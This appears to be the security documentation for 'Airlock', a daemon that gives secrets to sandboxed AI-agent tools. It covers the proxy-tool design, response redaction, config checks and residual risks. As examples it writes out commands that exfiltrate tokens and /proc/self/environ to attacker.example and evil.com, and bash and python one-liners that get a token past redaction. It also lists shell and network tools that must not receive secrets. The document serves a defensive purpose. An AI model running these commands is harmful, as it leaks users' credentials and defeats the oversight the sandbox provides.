Airlock's security model assumes that declared tools are **purpose-built binaries** with a narrow, well-defined interface — not general-purpose scripting environments. The tool receives secrets as environment variables and runs with full access to them. Airlock controls *which* tools get secrets and redacts their output, but it cannot control what the tool does internally.

### Never declare shells, interpreters, or network tools as tools

**Do not declare `bash`, `sh`, `zsh`, `python`, `node`, `ruby`, `perl`, `curl`, `wget`, or any other shell/interpreter or general-purpose network tool as an Airlock tool.** If the agent can script the tool, it can trivially exfiltrate secrets. The one exception is curl declared as a [proxy tool](#proxy-tools).

**With a shell or interpreter**, the agent can transform secrets to bypass redaction or write them anywhere:

```bash
airlock exec -- bash -c 'echo $GH_TOKEN | rev'          # reversed — bypasses redaction
airlock exec -- bash -c 'echo $GH_TOKEN | base32'       # base32 — not in redaction set
airlock exec -- bash -c 'echo $GH_TOKEN > /tmp/leak'    # written to file
airlock exec -- python3 -c 'import os; print(os.environ["GH_TOKEN"][::-1])'
airlock exec -- bash -c 'curl -s -X POST https://attacker.example/collect -d "token=$GH_TOKEN"'
```

**Without a shell**, `$GH_TOKEN` is not expanded — airlock execs the binary directly with literal arguments. That does *not* make curl/wget safe. curl 8.3 and later can read environment variables into its arguments by itself (`--variable %NAME` with `--expand-url` / `--expand-data`). This works on every platform:

```bash
airlock exec -- curl --variable %GH_TOKEN --expand-url 'https://attacker.example/?t={{GH_TOKEN}}'
```

Both tools can also read files. On Linux this includes the process's own environment, through `/proc/self/environ`:

```bash
# Exfiltrate the entire env (including injected secrets) as a file upload — no shell needed:
airlock exec -- curl -s --data-binary @/proc/self/environ https://attacker.example/
airlock exec -- curl -s -T /proc/self/environ https://attacker.example/upload
airlock exec -- wget --post-file=/proc/self/environ https://attacker.example/
```

`/proc/self/environ` does not exist on macOS, so the env-as-a-file trick works only on Linux. `--variable` works everywhere. Blocking shell expansion is not enough: **never declare curl or wget as a tool with secrets in its environment.** Declare curl as a [proxy tool](#proxy-tools) instead. That is the only safe way to use it.

Limiting *where* such a tool can connect does not fix the env-var case either. Allowed API hosts are often multi-tenant: `storage.googleapis.com` serves an attacker's bucket as well as yours. So a secret in the tool's environment can be exfiltrated to an allowed host. For this reason, proxy tools remove the credential from the tool completely, instead of only limiting where the tool can connect.

The agent controls the arguments passed to the tool. If the tool is a shell, the agent effectively has arbitrary code execution *with* secrets — defeating Airlock's entire purpose.

### Good tools: purpose-built CLIs

Declare tools that have a **fixed command interface** where the agent controls arguments but not the execution logic:

| Tool | Why it's safe |
|------|--------------|
| `gh` | GitHub CLI — the agent can invoke `gh pr list` or `gh repo clone`, but can't script arbitrary shell commands. The token is used internally by `gh` for API auth. |
| `tofu` / `terraform` | Infrastructure CLI — reads state, plans changes, applies them. The agent picks subcommands, not arbitrary code. |
| `gcloud` | Google Cloud CLI — structured subcommands for cloud resource management. |
| `aws` | AWS CLI — same pattern: structured subcommands, credentials used internally. |
| `kubectl` | Kubernetes CLI — manages cluster resources via structured commands. |
| `docker` | Container CLI — builds/runs containers (scope carefully, as `docker run` can mount host paths). |

### Never declare as Airlock tools (fine to run directly)

These tools are perfectly fine for the agent to use directly through its own sandbox — they just must not be given secrets via Airlock:

| Tool | Why it must not receive secrets |
|------|-------------------------------|
| `bash` / `sh` / `zsh` | Agent controls the entire script. Can transform and exfiltrate secrets in unlimited ways. |
| `python` / `python3` | Agent passes `-c` with arbitrary code. Full access to secrets via `os.environ`. |
| `node` / `ruby` / `perl` | Same — arbitrary code execution with secrets in the environment. |
| `env` | Only useful for debugging. In production, don't give the agent a tool that exists solely to print the environment. |
| `curl` / `wget` | Agent controls the URL. Could `POST` secrets to an attacker-controlled endpoint: `curl -d "$GH_TOKEN" https://evil.com`. curl is safe only as a [proxy tool](#proxy-tools), where it holds no secret. `wget` is not supported as a proxy tool: whether it reads the CA-bundle variables the daemon sets depends on its TLS backend, and we have not tested this. |
| `grep` / `cargo` / `npm` / `make` | Don't need secrets. Let the agent run them directly — no reason to route through Airlock. |

### The rule of thumb

**If the agent can construct arbitrary code or network requests through the tool's arguments, that tool should not receive secrets.** The tool should be a CLI that *uses* the secret internally (for API authentication, state access, etc.) rather than one that *exposes* it to agent-controlled logic.

**If the tool doesn't need secrets, don't declare it in Airlock at all.** Let the agent run it directly through its own sandbox.

## Proxy tools

A *proxy tool* is a tool with `proxy = true` and one or more `[[tools.<name>.routes]]`. It is the only safe way to declare a general-purpose HTTP client as an Airlock tool. Design notes: [docs/proxy-tools-design.md](docs/proxy-tools-design.md).

### The invariant

> **A proxy tool never holds a secret.** The daemon attaches the credential after the request has left the tool.

Config validation enforces the first part. At load time, Airlock rejects a proxy tool if its `env` contains a `{ secret = ... }` reference. It also rejects a proxy tool that sets `HTTP_PROXY`, `HTTPS_PROXY`, `ALL_PROXY`, `NO_PROXY`, `CURL_CA_BUNDLE`, `SSL_CERT_FILE`, `SSL_CERT_DIR`, `NODE_EXTRA_CA_CERTS` or `REQUESTS_CA_BUNDLE`, in any letter case, because the daemon sets these itself. So nothing the agent can extract from the tool's process (environment, files, memory) contains a secret.

Egress restriction is the second layer, not the first. It makes the set of hosts the tool can reach equal to its routes. It does not protect the credential.

### What the daemon does for each execution

1. Binds a TCP listener on `127.0.0.1:0` and reads back the **actual** port. The listener lives exactly as long as the child. Every exit path (normal exit, timeout, kill, client disconnect) closes it. When no proxy tool is running, nothing is bound.
2. Generates a random 32-byte token. The tool authenticates with `Proxy-Authorization: Basic base64("airlock:<token>")`. The proxy compares it in constant time and answers `407` on a mismatch. **The token is mandatory.** A session's trust rests on its token, but a loopback TCP port has no file mode, so any local user can connect to it. Without this token, another user could connect during an exec and have the daemon attach credentials to *their* requests. The tool can see the token, and so can the agent. This is fine: the token gives nothing that the agent does not already have through `airlock exec`.
3. Sets these environment variables:
   - `HTTPS_PROXY` / `https_proxy` / `HTTP_PROXY` / `http_proxy` / `ALL_PROXY` / `all_proxy` to `http://airlock:<token>@127.0.0.1:<port>`.
   - `NO_PROXY` / `no_proxy` to an empty string.
   - `CURL_CA_BUNDLE` / `SSL_CERT_FILE` / `REQUESTS_CA_BUNDLE` / `NODE_EXTRA_CA_CERTS` to the path of the CA certificate.

   The daemon applies these *after* the tool's own `env`, so these values win.
4. Builds the sandbox profile with network access limited to that port. See [Filesystem sandboxing](#filesystem-sandboxing) for the rule on each platform.

### What the proxy does for each request

| Condition | Result |
|---|---|
| `Proxy-Authorization` missing or wrong | `407` |
| Any method other than `CONNECT` (for example a plain `GET http://…`) | `403`. The proxy never attaches the credential to a cleartext request. |
| CONNECT to a port other than 443 | `403` |
| CONNECT to a host that no route matches | `403` (deny by default) |
| CONNECT while 32 tunnels are already open for this exec | `503`, sent before the `200`, so the tool can retry |
| The proxy cannot create a certificate for the host | `500`, sent before the `200`, and written to the audit log |
| Inside the tunnel: `Host` header ≠ the CONNECT authority | `400` (no domain fronting) |
| Inside the tunnel: absolute-form request target | `400` |
| `Transfer-Encoding` together with `Content-Length`, or two `Content-Length` headers | `400` (request smuggling) |
| An `X-HTTP-Method-Override`, `X-HTTP-Method` or `X-Method-Override` header, whatever its value | `403`. Upstreams such as Google APIs route by this header instead of the request method, so the method the rules checked would not be the one that runs. |
| The route's `allow` / `deny` rules do not permit the method and path | `403` |
| The path contains `.` or `..` segments, `//`, a backslash, a malformed percent-escape, or an escape that decodes to `/`, `\`, `%` or NUL | `403`. The proxy refuses the path instead of normalizing it, because the upstream may normalize it differently than the matcher. |
| The slot of the injected secret is `Stale` | `502` |
| The host resolves to a private, loopback, link-local (including `169.254.169.254`), CGNAT, ULA, multicast, documentation or other non-routable address | `502` |
| The upstream answers with a `Content-Encoding` other than `identity`, a transfer coding other than `chunked`, or a partial response (`206` / `Content-Range`) | `502`, and the proxy drops the body unread. See [Response redaction](#response-redaction). |

The proxy checks the allow/deny rules in this order. A request that matches any `deny` rule is refused, even if an `allow` rule also matches. If `allow` is empty, every request that no `deny` rule matches is allowed. If `allow` is not empty, a request must also match at least one `allow` rule. So with a non-empty `allow`, a request that matches neither list is refused.

The allow/deny rules are matched against the *percent-decoded* path, decoding each segment once, because the upstream routes on the decoded path. For example, GitHub treats `DELETE /%72epos/o/n` as `DELETE /repos/o/n`, so it must match `deny = ["DELETE /repos/**"]` in the same way. For this reason you write rules in decoded form, and a rule may not contain `%`.

Upstreams also disagree on two more details. Many frameworks treat `/x/` as `/x`, and servlet containers (Tomcat, Spring) remove `;params` from each segment. So the proxy checks `deny` rules against all of these forms of the path, and `allow` rules only against the path as sent. `deny = ["DELETE /secrets/*"]` therefore also refuses `DELETE /secrets/x/` and `DELETE /secrets/x;y`. A segment that becomes `.`, `..` or empty once its `;params` are removed (for example `..;`) is refused.

Before the proxy attaches the credential, it removes every copy of the injected header that the client sent. It also removes `Proxy-Authorization`, `Proxy-Connection` and the other hop-by-hop headers. The proxy reads the secret from the secret store **for each request**, so a background refresh applies to the next request. The proxy builds the header value in a buffer that is zeroized after use, never with `format!`, and marks the value as sensitive.

The proxy also changes the request so that the redactor can read the response. It always sets `Accept-Encoding` to `identity`, whatever the tool asked for, and it removes `Range` and `If-Range`.

### Response redaction

The proxy redacts everything the upstream sends back before it reaches the tool. It uses the same automaton and the same secret set as the tool's stdout: raw, base64, URL-encoded and hex variants of *every* secret in the session, not only the secret of this route.

- **All response header values**, including `Location`, `Set-Cookie` and `WWW-Authenticate`. If a value is not a valid header value after replacement, the proxy drops it. It never forwards the original.
- **The body**, streamed. The proxy buffers only a possible partial match at the end of a frame. So a multi-gigabyte download costs the same as a small one, and the tool's read rate controls the upstream read rate. A secret split across two upstream writes is still caught.
- **Trailers** are dropped, not forwarded.
- **The upstream's reason phrase** is dropped. `HTTP/1.1 200 <anything>` is a legal status line, and the reason phrase is outside the header map. So the tool sees the status code with the standard phrase, never the upstream's text.

The proxy takes the redactor from the session's live handle for each response. It does not use a copy taken when the exec started. A tool can run for minutes, and the proxy injects the value the store holds *now*. The redactor keeps the two newest values of a refreshed secret, so a refresh that happens in the middle of a response is still covered.

A `[REDACTED:name]` placeholder does not have the same length as the secret it replaces. So the upstream `Content-Length` is wrong whenever something matches, and the proxy cannot know this before it has read the body. For this reason the proxy removes `Content-Length` from every response that has a body, and hyper sends the response with chunked encoding (HTTP/1.1 always supports it). A response without a body (HEAD, `1xx`, `204`, `304`) keeps its `Content-Length`. In such a response the length describes the resource, not the bytes on the wire, so `curl -I` still shows it.

The proxy refuses three cases instead of handling them. The reason is the same for all three: the redactor matches bytes, not formats, and Airlock adds no decoder to the response path.

- **Compressed responses.** A byte-pattern scanner cannot see inside `gzip`, `br`, `zstd` or `deflate`. The request asks for `identity`. If the upstream compresses anyway, the proxy returns `502` and drops the body unread.
- **Unknown transfer codings**, for the same reason.
- **Byte ranges.** A range can start in the middle of a secret. The pattern would then be split across two responses that the proxy never sees together, while the tool joins the plaintext in a file. So the proxy removes `Range` and `If-Range` from the request, and the upstream sends the whole resource. If a `206` or `Content-Range` arrives anyway, the proxy refuses it. As a result, resumed and parallel-chunked downloads do not work through a proxy tool.

No configuration turns any of this off. Redaction on the output path is mandatory in Airlock, and the proxy is an output path.

If the proxy replaced anything in a response, the audit log records it. When the headers arrive, the log line includes the count of redacted header values. When the body ends, a second line gives the count for the body. The log records only counts, never the matched bytes.

The CONNECT authority is the single source of truth. It selects the route. It is the name in the leaf certificate shown to the tool. It is the name the proxy resolves and connects to. It is the name the proxy verifies the upstream certificate against (TLS 1.2 or later, public roots). The proxy ignores the client's SNI completely. So `curl --resolve`, `--connect-to`, a forged `Host` header or a forged SNI cannot make any two of these disagree. The proxy resolves DNS once and connects to the exact `SocketAddr` that passed the address check, so DNS rebinding cannot change the address between the check and the connection.

The proxy logs each request to the ring buffer: tool, method, host, path, decision and upstream status, tagged with the session id. It never logs a header value or the query string, because the query string can contain data.

### The CA

- ECDSA P-256. The daemon generates one CA per **session**, not per daemon, when `Register`/`Reload` finds a proxy tool in the session's config, and holds it in memory. The key is **never written to disk**. Nothing needs to trust a CA across sessions, because only children of the session that minted it use it.
- `CA:TRUE, pathlen:0`, plus X.509 **Name Constraints** that permit only the DNS names in the routes. So even a leaked key cannot sign certificates for other sites. A permitted subtree also covers the apex and deeper labels (`*.example.com` permits `example.com`). Route matching still decides exactly which certificates the proxy issues.
- Only the **certificate** is written to disk, to `<runtime base>/ca/<session-id>.pem` (mode `0644`), in the per-user runtime directory, never in the project, via a temp file and `rename` so a tool mid-`exec` never sees the path momentarily gone. A `Reload` whose routes are unchanged keeps the same CA — same key, same file, no rewrite — and only mints and writes a new one when the DNS names a route can reach actually change. It is readable only by that session's own proxy tools — see the Seatbelt ordering note under [macOS — Apple Seatbelt](#macos--apple-seatbelt-sbpl). The daemon removes the file unconditionally whenever the session ends, and also the moment a `Reload` drops the session's last proxy tool, rather than only when the session's *current* policy happens to have one — a reload can change policy's shape across its own lifetime, and the file's existence does not track it. If one is left behind anyway (a crash), the next daemon start removes it as stale state.
- The bundle given to the tool contains **only** this CA. The proxy intercepts every connection the tool can make, so the tool does not need public roots. Without them, a direct connection that somehow escaped the sandbox would still fail TLS.
- Tested: Apple's system `/usr/bin/curl` 8.7.1 (SecureTransport / LibreSSL 3.3.6) reads `CURL_CA_BUNDLE` for a connection through the proxy and accepts a leaf certificate from the name-constrained CA. Homebrew curl is not needed.

### Residual risks

- **Misuse, not leakage.** The agent gets the full API permissions of the credential on the routed hosts. This is broader than a purpose-built CLI. Mitigate this first with a narrowly scoped service account, then with allow/deny rules.
- **Data exfiltration to other tenants.** The tool can upload anything it can read to an attacker's project on an allowed multi-tenant host (`storage.googleapis.com` serves every GCP customer). It cannot upload the credential.
- **Allow/deny rules are a convenience, not an authorization system.** They see the path, not the body. A `POST` allowed for one purpose can do something else (`:batchUpdate`, GraphQL). Some web frameworks (Laravel, Symfony, Rails) also read the method from a `_method` field in a POST's form body or query string. The proxy refuses the method-override *headers*, but it does not parse bodies or query strings. IAM is the real permission boundary.
- **An upstream that *transforms* the secret is not caught.** [Response redaction](#response-redaction) closes the `curl -o` / `--dump-header` / `--trace` path for response bytes. What the tool writes to a file is already redacted, so the plaintext credential never exists inside the sandbox. Redaction does not catch an upstream that returns the secret reversed, split into pieces, or in an encoding the redactor does not know. The stdout path has the same limit. Redaction also does not apply to data the agent sends: the proxy forwards the query string and request body as the agent wrote them.
- **Linux egress restriction is port-scoped and TCP-only.** See [Linux — Landlock LSM](#linux--landlock-lsm).
- **HTTP/1.1 only.** ALPN offers only `http/1.1`, so gRPC and HTTP/2-only endpoints do not work.
- **Clients that pin certificates fail** because the proxy intercepts TLS. This is by design.

## Config safety

- **Discovery**: config is found by walking up from CWD toward `$HOME`, looking for `airlock.toml` or `airlock.local.toml`. Only files **owned by the current effective UID** are accepted, preventing privilege escalation via a crafted config in a shared directory.
- **TOCTOU-safe open**: Each file is opened with `O_NOFOLLOW` and the ownership check is run against `fstat` on the resulting fd. Rejects symlinks, non-regular files, and files whose UID changes between discovery and read. An attacker who cannot modify the containing directory cannot swap the file between the walk's ownership check and the read.
- **Size cap**: Each config file is truncated at 1 MiB and refused if it would exceed that, bounding allocation if something points the launcher at an oversized file.
- **`$HOME` sandbox-root refusal**: If config is discovered directly at `$HOME`, the whole home directory would become the sandbox root — exposing it to all sandboxed tools and the agent. Airlock refuses to start in that case unless the merged config contains `allow_home_root = true` (global or local layer only — a config error in the repo layer, since the repo can't know where each user's home is).
- **Unknown keys are a config error, in every layer, at every level.** A typo or a stray key from an old schema fails loudly at load time instead of being silently ignored and taking no effect.
- **Tool name validation**: Names must not contain `/` or `\`. This prevents PATH traversal attacks (e.g., `../../bin/malicious`).
- **CWD validation**: The client's working directory must be a subdirectory of (or equal to) the session's root. This uses proper path-component prefix checking — `"/tmp/project-evil"` does not pass validation for sandbox root `"/tmp/project"`.
- **Secret-fetcher commands bypass the sandbox.** `[secrets.<label>]` entries with `source = "command"` spawn processes under the launcher, inheriting its environment and filesystem permissions — Seatbelt/Landlock enforcement applies only to tool invocations, not to these commands. When `refresh` is set, the daemon re-runs the command on every interval, using the session's stored environment and filtered `PATH`. Review every `command = [...]` as you would a shell script you'd run yourself.
- **A filtered `PATH` resolves every binary and every command's `argv[0]`.** At session registration, the launcher takes its own `PATH`, drops relative entries and any entry inside the project root or a sandbox write grant, and uses the result both to resolve tool binaries and secret commands' `argv[0]`, and as the `PATH` handed to tools and secret commands themselves. Dropping, rather than refusing, the whole startup keeps a `node_modules/.bin`-on-`PATH` setup from direnv or mise working; a "binary not found" error names which entries were dropped and why. Without the second half — handing tools the *filtered* `PATH`, not the launcher's raw one — a declared `gh` could still end up running a planted `git` from a writable `PATH` entry, which would inherit `GH_TOKEN` through its own declared env.
- **The resolved binary is checked, not just found.** Both the tool binary and a secret command's resolved `argv[0]` are canonicalized and refused if they land inside the project root or a write grant, even if the `PATH` entry that produced them looked safe (a symlink can point from a safe entry into the project). An `argv[0]` containing `/` goes through the same check, so `command = ["./scripts/token.sh"]` is a config error — approving `airlock.toml` approves the command, not every file that command might read.
- **Interpreter arguments are not scanned, and that's a known gap, not an oversight.** `command = ["bash", "scripts/token.sh"]` approves running `bash`, but not the contents of `scripts/token.sh` at the time it runs — an agent that rewrites that script between approval and the next `refresh` changes what the approved command does. Airlock does not scan arguments for file paths (`--flagfile=./x`, `-c @config`, …): doing so would catch some cases and miss others, creating false confidence. Treat any `command` whose arguments name a project file as approving "whatever that file says right now", and prefer commands with no such argument where you can.
- **Stale secrets fail closed.** A refresh command that exits non-zero, times out, or fails to spawn marks the secret as stale; any subsequent `airlock exec` that references that secret returns an error rather than running the tool with the prior (likely-expired) value. The daemon keeps retrying with exponential backoff so the secret recovers automatically once the upstream is healthy. The error returned to the client names the secret label and the underlying reason — never the secret value.

## Protecting the anchors

Three locations decide what the daemon trusts and how clients reach it: the **runtime base** (socket, PID file, `admin.token`, proxy CAs), the **trust store** (approved copies of project config), and the **global config file** (your own, unapproved, cross-project bindings). None of them may sit where an agent's sandbox — in any project, from any layer, including an unapproved one — can write.

All three are resolved from XDG variables (`$XDG_STATE_HOME`, `$XDG_CONFIG_HOME`; the runtime base ignores the environment entirely, for reasons covered in `docs/airlock-v2-design.md#runtime-directory`) and then validated before use:

1. **Ownership and mode.** The trust store and runtime base must be owned by the effective uid, mode 0700, not a symlink. The global config file and its directory must be owned by the effective uid and not group- or world-writable.
2. **Outside the project root.**
3. **Outside every sandbox write grant**, from every config layer, including unapproved ones, and including `--allow-write` and built-in profile write paths. The one exception is macOS `$TMPDIR`, which the runtime base may legitimately sit under, because the Seatbelt deny rule (see [macOS — Apple Seatbelt](#macos--apple-seatbelt-sbpl)) carves it back out as the very last rule in every profile.

The same check runs from the other side at config load: a write grant that covers an anchor is a config error, whether or not the file granting it is approved yet. So an agent that edits `airlock.toml` to grant itself write access to the trust store is refused twice — the edit itself needs approval, and even an approved grant like that is rejected outright.

This closes the one anchor attack that needs no code execution: a committed `mise.toml` or `.envrc` that redirects `XDG_STATE_HOME` or `XDG_CONFIG_HOME` into the project on `cd`, applied automatically by a tool the user already trusts by path. It does **not** close the broader class of agent-written code the user runs outside any sandbox — see the next section.

**Debug-only test overrides never ship.** Development and CI use `AIRLOCK_TEST_RUNTIME_DIR` and `AIRLOCK_TEST_IDLE_EXIT_SECS` to point the runtime base and the idle-exit timer at a throwaway location instead of the real per-user runtime directory. Both are read only in `cfg(debug_assertions)` builds — a release build never consults them, under any environment, so an attacker cannot use either variable to redirect a production daemon's runtime base.

## Wire-protocol limits

- **Two message families.** Session requests (`Exec`, `Stdin`, `StdinEof`, `List`, `Check`) and admin requests (`Register`, `Reload`, session list/revoke/renew, `Logs`, `Stop`) are separate enums on the wire, gated by separate authentication (a session token vs. `admin.token`). A request whose family doesn't match its `auth.kind` is refused before any handler sees it.
- **NDJSON line cap**: Every line from a session-family connection is capped at 1 MiB by `tokio-util`'s `LinesCodec`, as in v1. Without this, a client that opens the socket and never sends a newline would force the daemon to grow its read buffer without bound.
- **A separate, larger cap for the admin family.** `Register` carries a whole merged config, resolved secret values, an environment snapshot and a filtered `PATH`, which can exceed 1 MiB on its own. Admin requests come only from a trusted launcher holding `admin.token`, so a larger bound for that family only is sound; it does not weaken the bound that protects the daemon from an arbitrary session-authenticated client.
- **Overflow handling**: An oversized session-family frame is answered with a generic `malformed request` / `request exceeds maximum length` error; an oversized stdin line during an active exec triggers SIGTERM → SIGKILL on the child's process group and returns `exit { code: -1 }` to the client.
- **Error messages are generic**: The daemon never echoes raw parser errors or line contents back to the client — parse failures log the underlying error to the ring buffer and return `"malformed request"` so no fragment of the offending input is reflected.

## Graceful shutdown

On SIGTERM:

1. The daemon stops accepting new connections.
2. SIGTERM is sent to all registered child PIDs, across every session.
3. After a 5-second grace period, remaining children receive SIGKILL.
4. Every session ends; their proxy CA files, the PID file and the socket are cleaned up.

`airlock daemon stop` and `daemon restart` ask first on a terminal when sessions exist (naming them), and refuse on a non-terminal unless `--yes` is given, since stopping ends every project's sessions, not just one.

## What Airlock does NOT protect against

### Destructive actions via tools

**This is by design.** Airlock prevents secret *leakage*, not secret *misuse*. If you supply a GitHub token with repo-delete permissions, the agent can invoke `gh repo delete` and the tool will succeed. Airlock ensures the agent can't *extract* the token and exfiltrate it — but the tools themselves run with the full authority of the credentials they receive.

**Mitigation:** Always use the narrowest possible token scope. GitHub fine-grained PATs, least-privilege IAM roles, read-only API keys. This is the single most impactful security measure you can take.

### Agent-written code run outside the sandbox

The agent can write files the user later runs unsandboxed, as themselves: a git hook (`.git/hooks/pre-commit`), `core.fsmonitor` or another `.git/config` setting, a committed `.envrc`, a `mise.toml` `[hooks]` entry, a `Makefile` or `package.json` script, or source code the user builds and runs. Any of that code can read `~/.config/gh`, call `op read` directly, or rewrite the trust store and global config, exactly as the user's own shell could — it runs with the user's full authority, not the agent's sandboxed one.

**This predates Airlock and is not specific to it.** Code the user chooses to run outside a sandbox already defeats credential isolation on its own; the trust store cannot be held to a higher standard than the secrets it guards. Denying a fixed list of paths would not close the class either — ordinary git use (`git push -u`, `git remote add`) writes `.git/config` legitimately, and build scripts and tests run as the user whenever the user builds.

**Mitigation:** [F9](#git-hooks-write-denial-f9) denies one common vector (`.git/hooks` writes) on macOS as defense in depth, which narrows but does not close this class. Review what an agent has changed in files that run outside any sandbox — hooks, `.envrc`, build scripts — the same way you'd review a PR that touches your CI config. This is also why repo and local config changes need [approval](README.md#approving-config) even though the repo file itself is "just config": the review step is the actual control, not a sandbox.

### Secrets transformed in novel ways

Redaction covers raw UTF-8, base64, URL-encoded, and hexadecimal forms. It does not cover arbitrary transformations — a tool that reverses the string, encrypts it, or splits it across multiple lines with interleaving will bypass the automaton.

**Mitigation:** Redaction is defense-in-depth. The primary defense is that the agent harness never receives tool secrets in the first place. This threat is largely eliminated by [never declaring shells or interpreters as tools](#never-declare-shells-interpreters-or-network-tools-as-tools) — purpose-built CLIs like `gh` or `tofu` don't offer the agent a way to transform secrets in their output.

### Side-channel leaks via writable paths

A tool could write its secrets to a file in a writable sandbox path. If the agent can read that path on a subsequent invocation (or through another tool), the secret is exposed. This is especially dangerous if the tool is a shell or interpreter where the agent controls the script — see [tool selection guidance](#tool-selection-what-should-and-should-not-be-an-airlock-tool).

**Mitigation:** Keep writable paths narrow. Don't grant tools write access to directories the agent harness can read directly. Don't declare scriptable tools. `{tool_state}` (see the README's [Configuration](README.md#configuration)) keeps a tool's own config directory out of the agent's reach by construction, rather than relying on the agent not looking.

### Network exfiltration by tools

An ordinary tool has unrestricted outbound network access. A compromised or malicious tool binary could send its secrets to an external endpoint.

**Mitigation:** Only declare tools you trust. Airlock limits *which* tools receive secrets, so a compromised `ls` binary with no declared secrets can't exfiltrate anything. A [proxy tool](#proxy-tools) is the only case where egress *is* restricted: the tool can connect only to one loopback port, and the routes decide which hosts the proxy forwards to. A proxy tool also holds no secret, so it has none to exfiltrate.

### Memory inspection

Secrets exist in the daemon's address space — now every session's, not just one project's. An attacker with root access, `ptrace` capabilities, or core dump access can read them.

**Mitigation:** Airlock applies best-effort hardening at daemon startup — `RLIMIT_CORE = 0` on both platforms, and on Linux `prctl(PR_SET_DUMPABLE, 0)` (which also blocks same-UID ptrace under `kernel.yama.ptrace_scope`). Secret values held in the daemon are wrapped in a `Secret<T>` newtype that zeroes their backing memory on drop. These are defense-in-depth; a local root user or a distro configured with a permissive `ptrace_scope` can still inspect the process. Run the daemon with appropriate OS-level protections — this remains a general concern for any process holding secrets, and is a cost of the one-daemon-per-user design: a single compromise now reaches every project's secrets rather than one. [F10](docs/airlock-v2-design.md#follow-ups) (moving the proxy, the largest piece of untrusted parsing, into its own process) is the planned next reduction; it does not change this section.

### Secrets visible via `/proc/<child_pid>/environ`

Secrets are passed to sandboxed tools as environment variables. On Linux, another process running as the same UID can read the child's environment via `/proc/<child_pid>/environ` for the lifetime of the child. This is the same threat class as same-UID ptrace of the daemon itself.

Airlock assumes same-UID processes are not adversarial — the enclosing agent sandbox is expected to address that.

**Planned mitigation:** set `PR_SET_DUMPABLE = 0` in the child's `pre_exec` so `/proc/<pid>/{environ,mem,maps}` revert to root ownership and same-UID ptrace is blocked under yama. Tracked in [TODO.md](TODO.md).

### Agent harness escape

If the agent harness is not sandboxed — or runs under an external sandbox that doesn't meet the [External sandboxes](#external-sandboxes) requirements — the agent could read the runtime directory, connect to the socket directly, or read another session's secrets from `/proc/<daemon_pid>/mem`. Airlock's daemon-client split only provides isolation if the agent actually runs in a restricted environment that meets those requirements.

**Mitigation:** Always sandbox the agent harness. Use `airlock run` (built-in OS-level sandbox), Claude Code's `--sandbox` mode with the [configuration above](#claude-code-sandbox-configuration), Docker, nsjail, bubblewrap, or similar. See the README's ["Where Airlock fits"](README.md#where-airlock-fits) section.
